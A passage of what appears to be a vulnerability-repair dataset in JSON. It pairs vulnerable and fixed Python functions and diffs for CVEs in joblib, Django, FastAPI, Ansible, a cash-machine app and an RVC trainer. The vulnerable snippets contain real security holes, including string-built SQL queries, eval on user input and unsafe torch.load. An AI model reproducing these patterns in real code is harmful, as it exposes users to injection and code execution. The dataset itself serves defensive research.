        "snippet": "def verify_checkpoint_shapes(checkpoint_path, model):\n    checkpoint = torch.load(checkpoint_path, map_location=\"cpu\")\n    checkpoint_state_dict = checkpoint[\"model\"]\n    try:\n        if hasattr(model, \"module\"):\n            model_state_dict = model.module.load_state_dict(checkpoint_state_dict)\n        else:\n            model_state_dict = model.load_state_dict(checkpoint_state_dict)\n    except RuntimeError:\n        print(\n            \"The parameters of the pretrain model such as the sample rate or architecture do not match the selected model.\"\n        )\n        sys.exit(1)\n    else:\n        del checkpoint\n        del checkpoint_state_dict\n        del model_state_dict"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_100_1",
        "commit": "eb21d9d",
        "file_path": "rvc/train/train.py",
        "start_line": "136",
        "end_line": "152",
        "snippet": "def verify_checkpoint_shapes(checkpoint_path, model):\n    checkpoint = torch.load(checkpoint_path, map_location=\"cpu\", weights_only=True)\n    checkpoint_state_dict = checkpoint[\"model\"]\n    try:\n        if hasattr(model, \"module\"):\n            model_state_dict = model.module.load_state_dict(checkpoint_state_dict)\n        else:\n            model_state_dict = model.load_state_dict(checkpoint_state_dict)\n    except RuntimeError:\n        print(\n            \"The parameters of the pretrain model such as the sample rate or architecture do not match the selected model.\"\n        )\n        sys.exit(1)\n    else:\n        del checkpoint\n        del checkpoint_state_dict\n        del model_state_dict"
      }
    ],
    "vul_patch": "--- a/rvc/train/train.py\n+++ b/rvc/train/train.py\n@@ -1,5 +1,5 @@\n def verify_checkpoint_shapes(checkpoint_path, model):\n-    checkpoint = torch.load(checkpoint_path, map_location=\"cpu\")\n+    checkpoint = torch.load(checkpoint_path, map_location=\"cpu\", weights_only=True)\n     checkpoint_state_dict = checkpoint[\"model\"]\n     try:\n         if hasattr(model, \"module\"):\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-21797",
    "cve_description": "The package joblib from 0 and before 1.2.0 are vulnerable to Arbitrary Code Execution via the pre_dispatch flag in Parallel() class due to the eval() statement.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/joblib/joblib",
    "patch_url": [
      "https://github.com/joblib/joblib/commit/6638b9e9711ad1ebbf6dd95aa7cee0dca9897b42",
      "https://github.com/joblib/joblib/commit/b90f10efeb670a2cc877fb88ebb3f2019189e059"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_414_1",
        "commit": "1f00a1c30a107342bfb77ef39c0d65f5991eb1bc",
        "file_path": "joblib/parallel.py",
        "start_line": 999,
        "end_line": 1114,
        "snippet": "    def __call__(self, iterable):\n        if self._jobs:\n            raise ValueError('This Parallel instance is already running')\n        # A flag used to abort the dispatching of jobs in case an\n        # exception is found\n        self._aborting = False\n\n        if not self._managed_backend:\n            n_jobs = self._initialize_backend()\n        else:\n            n_jobs = self._effective_n_jobs()\n\n        if isinstance(self._backend, LokyBackend):\n            # For the loky backend, we add a callback executed when reducing\n            # BatchCalls, that makes the loky executor use a temporary folder\n            # specific to this Parallel object when pickling temporary memmaps.\n            # This callback is necessary to ensure that several Parallel\n            # objects using the same resuable executor don't use the same\n            # temporary resources.\n\n            def _batched_calls_reducer_callback():\n                # Relevant implementation detail: the following lines, called\n                # when reducing BatchedCalls, are called in a thread-safe\n                # situation, meaning that the context of the temporary folder\n                # manager will not be changed in between the callback execution\n                # and the end of the BatchedCalls pickling. The reason is that\n                # pickling (the only place where set_current_context is used)\n                # is done from a single thread (the queue_feeder_thread).\n                self._backend._workers._temp_folder_manager.set_current_context(  # noqa\n                    self._id\n                )\n            self._reducer_callback = _batched_calls_reducer_callback\n\n        # self._effective_n_jobs should be called in the Parallel.__call__\n        # thread only -- store its value in an attribute for further queries.\n        self._cached_effective_n_jobs = n_jobs\n\n        backend_name = self._backend.__class__.__name__\n        if n_jobs == 0:\n            raise RuntimeError(\"%s has no active worker.\" % backend_name)\n\n        self._print(\"Using backend %s with %d concurrent workers.\",\n                    (backend_name, n_jobs))\n        if hasattr(self._backend, 'start_call'):\n            self._backend.start_call()\n        iterator = iter(iterable)\n        pre_dispatch = self.pre_dispatch\n\n        if pre_dispatch == 'all' or n_jobs == 1:\n            # prevent further dispatch via multiprocessing callback thread\n            self._original_iterator = None\n            self._pre_dispatch_amount = 0\n        else:\n            self._original_iterator = iterator\n            if hasattr(pre_dispatch, 'endswith'):\n                pre_dispatch = eval(\n                    pre_dispatch,\n                    {\"n_jobs\": n_jobs, \"__builtins__\": {}},  # globals\n                    {}  # locals\n                )\n            self._pre_dispatch_amount = pre_dispatch = int(pre_dispatch)\n\n            # The main thread will consume the first pre_dispatch items and\n            # the remaining items will later be lazily dispatched by async\n            # callbacks upon task completions.\n\n            # TODO: this iterator should be batch_size * n_jobs\n            iterator = itertools.islice(iterator, self._pre_dispatch_amount)\n\n        self._start_time = time.time()\n        self.n_dispatched_batches = 0\n        self.n_dispatched_tasks = 0\n        self.n_completed_tasks = 0\n        # Use a caching dict for callables that are pickled with cloudpickle to\n        # improve performances. This cache is used only in the case of\n        # functions that are defined in the __main__ module, functions that are\n        # defined locally (inside another function) and lambda expressions.\n        self._pickle_cache = dict()\n        try:\n            # Only set self._iterating to True if at least a batch\n            # was dispatched. In particular this covers the edge\n            # case of Parallel used with an exhausted iterator. If\n            # self._original_iterator is None, then this means either\n            # that pre_dispatch == \"all\", n_jobs == 1 or that the first batch\n            # was very quick and its callback already dispatched all the\n            # remaining jobs.\n            self._iterating = False\n            if self.dispatch_one_batch(iterator):\n                self._iterating = self._original_iterator is not None\n\n            while self.dispatch_one_batch(iterator):\n                pass\n\n            if pre_dispatch == \"all\" or n_jobs == 1:\n                # The iterable was consumed all at once by the above for loop.\n                # No need to wait for async callbacks to trigger to\n                # consumption.\n                self._iterating = False\n\n            with self._backend.retrieval_context():\n                self.retrieve()\n            # Make sure that we get a last message telling us we are done\n            elapsed_time = time.time() - self._start_time\n            self._print('Done %3i out of %3i | elapsed: %s finished',\n                        (len(self._output), len(self._output),\n                         short_format_time(elapsed_time)))\n        finally:\n            if hasattr(self._backend, 'stop_call'):\n                self._backend.stop_call()\n            if not self._managed_backend:\n                self._terminate_backend()\n            self._jobs = list()\n            self._pickle_cache = None\n        output = self._output\n        self._output = None\n        return output"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_414_1",
        "commit": "6638b9e9711ad1ebbf6dd95aa7cee0dca9897b42",
        "file_path": "joblib/parallel.py",
        "start_line": 1000,
        "end_line": 1113,
        "snippet": "    def __call__(self, iterable):\n        if self._jobs:\n            raise ValueError('This Parallel instance is already running')\n        # A flag used to abort the dispatching of jobs in case an\n        # exception is found\n        self._aborting = False\n\n        if not self._managed_backend:\n            n_jobs = self._initialize_backend()\n        else:\n            n_jobs = self._effective_n_jobs()\n\n        if isinstance(self._backend, LokyBackend):\n            # For the loky backend, we add a callback executed when reducing\n            # BatchCalls, that makes the loky executor use a temporary folder\n            # specific to this Parallel object when pickling temporary memmaps.\n            # This callback is necessary to ensure that several Parallel\n            # objects using the same resuable executor don't use the same\n            # temporary resources.\n\n            def _batched_calls_reducer_callback():\n                # Relevant implementation detail: the following lines, called\n                # when reducing BatchedCalls, are called in a thread-safe\n                # situation, meaning that the context of the temporary folder\n                # manager will not be changed in between the callback execution\n                # and the end of the BatchedCalls pickling. The reason is that\n                # pickling (the only place where set_current_context is used)\n                # is done from a single thread (the queue_feeder_thread).\n                self._backend._workers._temp_folder_manager.set_current_context(  # noqa\n                    self._id\n                )\n            self._reducer_callback = _batched_calls_reducer_callback\n\n        # self._effective_n_jobs should be called in the Parallel.__call__\n        # thread only -- store its value in an attribute for further queries.\n        self._cached_effective_n_jobs = n_jobs\n\n        backend_name = self._backend.__class__.__name__\n        if n_jobs == 0:\n            raise RuntimeError(\"%s has no active worker.\" % backend_name)\n\n        self._print(\"Using backend %s with %d concurrent workers.\",\n                    (backend_name, n_jobs))\n        if hasattr(self._backend, 'start_call'):\n            self._backend.start_call()\n        iterator = iter(iterable)\n        pre_dispatch = self.pre_dispatch\n\n        if pre_dispatch == 'all' or n_jobs == 1:\n            # prevent further dispatch via multiprocessing callback thread\n            self._original_iterator = None\n            self._pre_dispatch_amount = 0\n        else:\n            self._original_iterator = iterator\n            if hasattr(pre_dispatch, 'endswith'):\n                pre_dispatch = eval_expr(\n                    pre_dispatch.replace(\"n_jobs\", str(n_jobs))\n                )\n            self._pre_dispatch_amount = pre_dispatch = int(pre_dispatch)\n\n            # The main thread will consume the first pre_dispatch items and\n            # the remaining items will later be lazily dispatched by async\n            # callbacks upon task completions.\n\n            # TODO: this iterator should be batch_size * n_jobs\n            iterator = itertools.islice(iterator, self._pre_dispatch_amount)\n\n        self._start_time = time.time()\n        self.n_dispatched_batches = 0\n        self.n_dispatched_tasks = 0\n        self.n_completed_tasks = 0\n        # Use a caching dict for callables that are pickled with cloudpickle to\n        # improve performances. This cache is used only in the case of\n        # functions that are defined in the __main__ module, functions that are\n        # defined locally (inside another function) and lambda expressions.\n        self._pickle_cache = dict()\n        try:\n            # Only set self._iterating to True if at least a batch\n            # was dispatched. In particular this covers the edge\n            # case of Parallel used with an exhausted iterator. If\n            # self._original_iterator is None, then this means either\n            # that pre_dispatch == \"all\", n_jobs == 1 or that the first batch\n            # was very quick and its callback already dispatched all the\n            # remaining jobs.\n            self._iterating = False\n            if self.dispatch_one_batch(iterator):\n                self._iterating = self._original_iterator is not None\n\n            while self.dispatch_one_batch(iterator):\n                pass\n\n            if pre_dispatch == \"all\" or n_jobs == 1:\n                # The iterable was consumed all at once by the above for loop.\n                # No need to wait for async callbacks to trigger to\n                # consumption.\n                self._iterating = False\n\n            with self._backend.retrieval_context():\n                self.retrieve()\n            # Make sure that we get a last message telling us we are done\n            elapsed_time = time.time() - self._start_time\n            self._print('Done %3i out of %3i | elapsed: %s finished',\n                        (len(self._output), len(self._output),\n                         short_format_time(elapsed_time)))\n        finally:\n            if hasattr(self._backend, 'stop_call'):\n                self._backend.stop_call()\n            if not self._managed_backend:\n                self._terminate_backend()\n            self._jobs = list()\n            self._pickle_cache = None\n        output = self._output\n        self._output = None\n        return output"
      }
    ],
    "vul_patch": "--- a/joblib/parallel.py\n+++ b/joblib/parallel.py\n@@ -53,10 +53,8 @@\n         else:\n             self._original_iterator = iterator\n             if hasattr(pre_dispatch, 'endswith'):\n-                pre_dispatch = eval(\n-                    pre_dispatch,\n-                    {\"n_jobs\": n_jobs, \"__builtins__\": {}},  # globals\n-                    {}  # locals\n+                pre_dispatch = eval_expr(\n+                    pre_dispatch.replace(\"n_jobs\", str(n_jobs))\n                 )\n             self._pre_dispatch_amount = pre_dispatch = int(pre_dispatch)\n \n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2017-7234",
    "cve_description": "A maliciously crafted URL to a Django (1.10 before 1.10.7, 1.9 before 1.9.13, and 1.8 before 1.8.18) site using the ``django.views.static.serve()`` view could redirect to any other domain, aka an open redirect vulnerability.",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/django/django",
    "patch_url": [
      "https://github.com/django/django/commit/2a9f6ef71b8e23fd267ee2be1be26dde8ab67037",
      "https://github.com/django/django/commit/5f1ffb07afc1e59729ce2b283124116d6c0659e4",
      "https://github.com/django/django/commit/4a6b945dffe8d10e7cec107d93e6efaebfbded29"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_377_1",
        "commit": "15eb3b4c03f4a1dc74c3314d57a3ef5b67f383b4",
        "file_path": "django/views/static.py",
        "start_line": 23,
        "end_line": 74,
        "snippet": "def serve(request, path, document_root=None, show_indexes=False):\n    \"\"\"\n    Serve static files below a given point in the directory structure.\n\n    To use, put a URL pattern such as::\n\n        from django.views.static import serve\n\n        url(r'^(?P<path>.*)$', serve, {'document_root': '/path/to/my/files/'})\n\n    in your URLconf. You must provide the ``document_root`` param. You may\n    also set ``show_indexes`` to ``True`` if you'd like to serve a basic index\n    of the directory.  This index view will use the template hardcoded below,\n    but if you'd like to override it, you can create a template called\n    ``static/directory_index.html``.\n    \"\"\"\n    path = posixpath.normpath(unquote(path))\n    path = path.lstrip('/')\n    newpath = ''\n    for part in path.split('/'):\n        if not part:\n            # Strip empty path components.\n            continue\n        drive, part = os.path.splitdrive(part)\n        head, part = os.path.split(part)\n        if part in (os.curdir, os.pardir):\n            # Strip '.' and '..' in path.\n            continue\n        newpath = os.path.join(newpath, part).replace('\\\\', '/')\n    if newpath and path != newpath:\n        return HttpResponseRedirect(newpath)\n    fullpath = os.path.join(document_root, newpath)\n    if os.path.isdir(fullpath):\n        if show_indexes:\n            return directory_index(newpath, fullpath)\n        raise Http404(_(\"Directory indexes are not allowed here.\"))\n    if not os.path.exists(fullpath):\n        raise Http404(_('\"%(path)s\" does not exist') % {'path': fullpath})\n    # Respect the If-Modified-Since header.\n    statobj = os.stat(fullpath)\n    if not was_modified_since(request.META.get('HTTP_IF_MODIFIED_SINCE'),\n                              statobj.st_mtime, statobj.st_size):\n        return HttpResponseNotModified()\n    content_type, encoding = mimetypes.guess_type(fullpath)\n    content_type = content_type or 'application/octet-stream'\n    response = FileResponse(open(fullpath, 'rb'), content_type=content_type)\n    response[\"Last-Modified\"] = http_date(statobj.st_mtime)\n    if stat.S_ISREG(statobj.st_mode):\n        response[\"Content-Length\"] = statobj.st_size\n    if encoding:\n        response[\"Content-Encoding\"] = encoding\n    return response"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_377_1",
        "commit": "2a9f6ef71b8e23fd267ee2be1be26dde8ab67037",
        "file_path": "django/views/static.py",
        "start_line": 23,
        "end_line": 60,
        "snippet": "def serve(request, path, document_root=None, show_indexes=False):\n    \"\"\"\n    Serve static files below a given point in the directory structure.\n\n    To use, put a URL pattern such as::\n\n        from django.views.static import serve\n\n        url(r'^(?P<path>.*)$', serve, {'document_root': '/path/to/my/files/'})\n\n    in your URLconf. You must provide the ``document_root`` param. You may\n    also set ``show_indexes`` to ``True`` if you'd like to serve a basic index\n    of the directory.  This index view will use the template hardcoded below,\n    but if you'd like to override it, you can create a template called\n    ``static/directory_index.html``.\n    \"\"\"\n    path = posixpath.normpath(unquote(path)).lstrip('/')\n    fullpath = safe_join(document_root, path)\n    if os.path.isdir(fullpath):\n        if show_indexes:\n            return directory_index(path, fullpath)\n        raise Http404(_(\"Directory indexes are not allowed here.\"))\n    if not os.path.exists(fullpath):\n        raise Http404(_('\"%(path)s\" does not exist') % {'path': fullpath})\n    # Respect the If-Modified-Since header.\n    statobj = os.stat(fullpath)\n    if not was_modified_since(request.META.get('HTTP_IF_MODIFIED_SINCE'),\n                              statobj.st_mtime, statobj.st_size):\n        return HttpResponseNotModified()\n    content_type, encoding = mimetypes.guess_type(fullpath)\n    content_type = content_type or 'application/octet-stream'\n    response = FileResponse(open(fullpath, 'rb'), content_type=content_type)\n    response[\"Last-Modified\"] = http_date(statobj.st_mtime)\n    if stat.S_ISREG(statobj.st_mode):\n        response[\"Content-Length\"] = statobj.st_size\n    if encoding:\n        response[\"Content-Encoding\"] = encoding\n    return response"
      }
    ],
    "vul_patch": "--- a/django/views/static.py\n+++ b/django/views/static.py\n@@ -14,25 +14,11 @@\n     but if you'd like to override it, you can create a template called\n     ``static/directory_index.html``.\n     \"\"\"\n-    path = posixpath.normpath(unquote(path))\n-    path = path.lstrip('/')\n-    newpath = ''\n-    for part in path.split('/'):\n-        if not part:\n-            # Strip empty path components.\n-            continue\n-        drive, part = os.path.splitdrive(part)\n-        head, part = os.path.split(part)\n-        if part in (os.curdir, os.pardir):\n-            # Strip '.' and '..' in path.\n-            continue\n-        newpath = os.path.join(newpath, part).replace('\\\\', '/')\n-    if newpath and path != newpath:\n-        return HttpResponseRedirect(newpath)\n-    fullpath = os.path.join(document_root, newpath)\n+    path = posixpath.normpath(unquote(path)).lstrip('/')\n+    fullpath = safe_join(document_root, path)\n     if os.path.isdir(fullpath):\n         if show_indexes:\n-            return directory_index(newpath, fullpath)\n+            return directory_index(path, fullpath)\n         raise Http404(_(\"Directory indexes are not allowed here.\"))\n     if not os.path.exists(fullpath):\n         raise Http404(_('\"%(path)s\" does not exist') % {'path': fullpath})\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-32677",
    "cve_description": "FastAPI is a web framework for building APIs with Python 3.6+ based on standard Python type hints. FastAPI versions lower than 0.65.2 that used cookies for authentication in path operations that received JSON payloads sent by browsers were vulnerable to a Cross-Site Request Forgery (CSRF) attack. In versions lower than 0.65.2, FastAPI would try to read the request payload as JSON even if the content-type header sent was not set to application/json or a compatible JSON media type (e.g. application/geo+json). A request with a content type of text/plain containing JSON data would be accepted and the JSON data would be extracted. Requests with content type text/plain are exempt from CORS preflights, for being considered Simple requests. The browser will execute them right away including cookies, and the text content could be a JSON string that would be parsed and accepted by the FastAPI application. This is fixed in FastAPI 0.65.2. The request data is now parsed as JSON only if the content-type header is application/json or another JSON compatible media type like application/geo+json. It's best to upgrade to the latest FastAPI, but if updating is not possible then a middleware or a dependency that checks the content-type header and aborts the request if it is not application/json or another JSON compatible content type can act as a mitigating workaround.",
    "cwe_info": {
      "CWE-352": {
        "name": "Cross-Site Request Forgery (CSRF)",
        "description": "The web application does not, or cannot, sufficiently verify whether a request was intentionally provided by the user who sent the request, which could have originated from an unauthorized actor. "
      }
    },
    "repo": "https://github.com/tiangolo/fastapi",
    "patch_url": [
      "https://github.com/tiangolo/fastapi/commit/fa7e3c996edf2d5482fff8f9d890ac2390dede4d"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_423_1",
        "commit": "90120dd",
        "file_path": "fastapi/routing.py",
        "start_line": 175,
        "end_line": 228,
        "snippet": "    async def app(request: Request) -> Response:\n        try:\n            body = None\n            if body_field:\n                if is_body_form:\n                    body = await request.form()\n                else:\n                    body_bytes = await request.body()\n                    if body_bytes:\n                        body = await request.json()\n        except json.JSONDecodeError as e:\n            raise RequestValidationError([ErrorWrapper(e, (\"body\", e.pos))], body=e.doc)\n        except Exception as e:\n            raise HTTPException(\n                status_code=400, detail=\"There was an error parsing the body\"\n            ) from e\n        solved_result = await solve_dependencies(\n            request=request,\n            dependant=dependant,\n            body=body,\n            dependency_overrides_provider=dependency_overrides_provider,\n        )\n        values, errors, background_tasks, sub_response, _ = solved_result\n        if errors:\n            raise RequestValidationError(errors, body=body)\n        else:\n            raw_response = await run_endpoint_function(\n                dependant=dependant, values=values, is_coroutine=is_coroutine\n            )\n\n            if isinstance(raw_response, Response):\n                if raw_response.background is None:\n                    raw_response.background = background_tasks\n                return raw_response\n            response_data = await serialize_response(\n                field=response_field,\n                response_content=raw_response,\n                include=response_model_include,\n                exclude=response_model_exclude,\n                by_alias=response_model_by_alias,\n                exclude_unset=response_model_exclude_unset,\n                exclude_defaults=response_model_exclude_defaults,\n                exclude_none=response_model_exclude_none,\n                is_coroutine=is_coroutine,\n            )\n            response = actual_response_class(\n                content=response_data,\n                status_code=status_code,\n                background=background_tasks,  # type: ignore # in Starlette\n            )\n            response.headers.raw.extend(sub_response.headers.raw)\n            if sub_response.status_code:\n                response.status_code = sub_response.status_code\n            return response"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_423_1",
        "commit": "fa7e3c996edf2d5482fff8f9d890ac2390dede4d",
        "file_path": "fastapi/routing.py",
        "start_line": 176,
        "end_line": 241,
        "snippet": "    async def app(request: Request) -> Response:\n        try:\n            body: Any = None\n            if body_field:\n                if is_body_form:\n                    body = await request.form()\n                else:\n                    body_bytes = await request.body()\n                    if body_bytes:\n                        json_body: Any = Undefined\n                        content_type_value = request.headers.get(\"content-type\")\n                        if content_type_value:\n                            message = email.message.Message()\n                            message[\"content-type\"] = content_type_value\n                            if message.get_content_maintype() == \"application\":\n                                subtype = message.get_content_subtype()\n                                if subtype == \"json\" or subtype.endswith(\"+json\"):\n                                    json_body = await request.json()\n                        if json_body != Undefined:\n                            body = json_body\n                        else:\n                            body = body_bytes\n        except json.JSONDecodeError as e:\n            raise RequestValidationError([ErrorWrapper(e, (\"body\", e.pos))], body=e.doc)\n        except Exception as e:\n            raise HTTPException(\n                status_code=400, detail=\"There was an error parsing the body\"\n            ) from e\n        solved_result = await solve_dependencies(\n            request=request,\n            dependant=dependant,\n            body=body,\n            dependency_overrides_provider=dependency_overrides_provider,\n        )\n        values, errors, background_tasks, sub_response, _ = solved_result\n        if errors:\n            raise RequestValidationError(errors, body=body)\n        else:\n            raw_response = await run_endpoint_function(\n                dependant=dependant, values=values, is_coroutine=is_coroutine\n            )\n\n            if isinstance(raw_response, Response):\n                if raw_response.background is None:\n                    raw_response.background = background_tasks\n                return raw_response\n            response_data = await serialize_response(\n                field=response_field,\n                response_content=raw_response,\n                include=response_model_include,\n                exclude=response_model_exclude,\n                by_alias=response_model_by_alias,\n                exclude_unset=response_model_exclude_unset,\n                exclude_defaults=response_model_exclude_defaults,\n                exclude_none=response_model_exclude_none,\n                is_coroutine=is_coroutine,\n            )\n            response = actual_response_class(\n                content=response_data,\n                status_code=status_code,\n                background=background_tasks,  # type: ignore # in Starlette\n            )\n            response.headers.raw.extend(sub_response.headers.raw)\n            if sub_response.status_code:\n                response.status_code = sub_response.status_code\n            return response"
      }
    ],
    "vul_patch": "--- a/fastapi/routing.py\n+++ b/fastapi/routing.py\n@@ -1,13 +1,25 @@\n     async def app(request: Request) -> Response:\n         try:\n-            body = None\n+            body: Any = None\n             if body_field:\n                 if is_body_form:\n                     body = await request.form()\n                 else:\n                     body_bytes = await request.body()\n                     if body_bytes:\n-                        body = await request.json()\n+                        json_body: Any = Undefined\n+                        content_type_value = request.headers.get(\"content-type\")\n+                        if content_type_value:\n+                            message = email.message.Message()\n+                            message[\"content-type\"] = content_type_value\n+                            if message.get_content_maintype() == \"application\":\n+                                subtype = message.get_content_subtype()\n+                                if subtype == \"json\" or subtype.endswith(\"+json\"):\n+                                    json_body = await request.json()\n+                        if json_body != Undefined:\n+                            body = json_body\n+                        else:\n+                            body = body_bytes\n         except json.JSONDecodeError as e:\n             raise RequestValidationError([ErrorWrapper(e, (\"body\", e.pos))], body=e.doc)\n         except Exception as e:\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2015-10069",
    "cve_description": "A vulnerability was found in viakondratiuk cash-machine. It has been declared as critical. This vulnerability affects the function is_card_pin_at_session/update_failed_attempts of the file machine.py. The manipulation leads to sql injection. The name of the patch is 62a6e24efdfa195b70d7df140d8287fdc38eb66d. It is recommended to apply a patch to fix this issue. The identifier of this vulnerability is VDB-218896.",
    "cwe_info": {
      "CWE-89": {
        "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
        "description": "The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component. Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data."
      }
    },
    "repo": "https://github.com/viakondratiuk/cash-machine",
    "patch_url": [
      "https://github.com/viakondratiuk/cash-machine/commit/62a6e24efdfa195b70d7df140d8287fdc38eb66d"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_408_1",
        "commit": "e3496978a07aa6f53aa76c7223df311dd8424f20",
        "file_path": "machine.py",
        "start_line": 153,
        "end_line": 166,
        "snippet": "def get_card(request, cc_number):\n    q = \"select * from cards where cc_number = '%s'\" % cc_number.replace('-', '')\n    row = request.db.execute(q).fetchone()\n    if row is not None:\n        return dict(\n            id = row[0],\n            cc_number = row[1],\n            pin = row[2],\n            failed_attempts = row[3],\n            status = row[4],\n            balance = row[5],\n            cc_dashed = cc_number,\n            valid_pin = False\n        )"
      },
      {
        "id": "vul_py_408_2",
        "commit": "e3496978a07aa6f53aa76c7223df311dd8424f20",
        "file_path": "machine.py",
        "start_line": 173,
        "end_line": 176,
        "snippet": "def block_card(request):\n    card = request.session['card']\n    request.db.execute(\"update cards set status = 'blocked' where id = %s\" % card['id'])\n    request.db.commit()"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_408_1",
        "commit": "62a6e24efdfa195b70d7df140d8287fdc38eb66d",
        "file_path": "machine.py",
        "start_line": 153,
        "end_line": 165,
        "snippet": "def get_card(request, cc_number):\n    row = request.db.execute(\"select * from cards where cc_number = ?\", (cc_number.replace('-', ''),)).fetchone()\n    if row is not None:\n        return dict(\n            id = row[0],\n            cc_number = row[1],\n            pin = row[2],\n            failed_attempts = row[3],\n            status = row[4],\n            balance = row[5],\n            cc_dashed = cc_number,\n            valid_pin = False\n        )"
      },
      {
        "id": "fix_py_408_2",
        "commit": "62a6e24efdfa195b70d7df140d8287fdc38eb66d",
        "file_path": "machine.py",
        "start_line": 172,
        "end_line": 175,
        "snippet": "def block_card(request):\n    card = request.session['card']\n    request.db.execute(\"update cards set status = 'blocked' where id = ?\", (card['id'],))\n    request.db.commit()"
      }
    ],
    "vul_patch": "--- a/machine.py\n+++ b/machine.py\n@@ -1,6 +1,5 @@\n def get_card(request, cc_number):\n-    q = \"select * from cards where cc_number = '%s'\" % cc_number.replace('-', '')\n-    row = request.db.execute(q).fetchone()\n+    row = request.db.execute(\"select * from cards where cc_number = ?\", (cc_number.replace('-', ''),)).fetchone()\n     if row is not None:\n         return dict(\n             id = row[0],\n\n--- a/machine.py\n+++ b/machine.py\n@@ -1,4 +1,4 @@\n def block_card(request):\n     card = request.session['card']\n-    request.db.execute(\"update cards set status = 'blocked' where id = %s\" % card['id'])\n+    request.db.execute(\"update cards set status = 'blocked' where id = ?\", (card['id'],))\n     request.db.commit()\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2019-3828",
    "cve_description": "Ansible fetch module before versions 2.5.15, 2.6.14, 2.7.8 has a path traversal vulnerability which allows copying and overwriting files outside of the specified destination in the local ansible controller host, by not restricting an absolute path.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/ansible/ansible",
    "patch_url": [
      "https://github.com/ansible/ansible/commit/f3edc091523fbe301926b7a0db25fbbd96940d93",
      "https://github.com/ansible/ansible/commit/396a2f74717477d80600450e2b7e45349d7b5110",
      "https://github.com/ansible/ansible/commit/4be3215d2f9f84ca283895879f0c6ce1ed7dd333"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_280_1",
        "commit": "ad9be10",
        "file_path": "lib/ansible/plugins/action/__init__.py",
        "start_line": 564,
        "end_line": 612,
        "snippet": "    def _remote_expand_user(self, path, sudoable=True, pathsep=None):\n        ''' takes a remote path and performs tilde/$HOME expansion on the remote host '''\n\n        # We only expand ~/path and ~username/path\n        if not path.startswith('~'):\n            return path\n\n        # Per Jborean, we don't have to worry about Windows as we don't have a notion of user's home\n        # dir there.\n        split_path = path.split(os.path.sep, 1)\n        expand_path = split_path[0]\n\n        if expand_path == '~':\n            # Network connection plugins (network_cli, netconf, etc.) execute on the controller, rather than the remote host.\n            # As such, we want to avoid using remote_user for paths  as remote_user may not line up with the local user\n            # This is a hack and should be solved by more intelligent handling of remote_tmp in 2.7\n            if getattr(self._connection, '_remote_is_local', False):\n                pass\n            elif sudoable and self._play_context.become and self._play_context.become_user:\n                expand_path = '~%s' % self._play_context.become_user\n            else:\n                # use remote user instead, if none set default to current user\n                expand_path = '~%s' % (self._play_context.remote_user or self._connection.default_user or '')\n\n        # use shell to construct appropriate command and execute\n        cmd = self._connection._shell.expand_user(expand_path)\n        data = self._low_level_execute_command(cmd, sudoable=False)\n\n        try:\n            initial_fragment = data['stdout'].strip().splitlines()[-1]\n        except IndexError:\n            initial_fragment = None\n\n        if not initial_fragment:\n            # Something went wrong trying to expand the path remotely. Try using pwd, if not, return\n            # the original string\n            cmd = self._connection._shell.pwd()\n            pwd = self._low_level_execute_command(cmd, sudoable=False).get('stdout', '').strip()\n            if pwd:\n                expanded = pwd\n            else:\n                expanded = path\n\n        elif len(split_path) > 1:\n            expanded = self._connection._shell.join_path(initial_fragment, *split_path[1:])\n        else:\n            expanded = initial_fragment\n\n        return expanded"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_280_1",
        "commit": "f3edc091523fbe301926b7a0db25fbbd96940d93",
        "file_path": "lib/ansible/plugins/action/__init__.py",
        "start_line": 564,
        "end_line": 615,
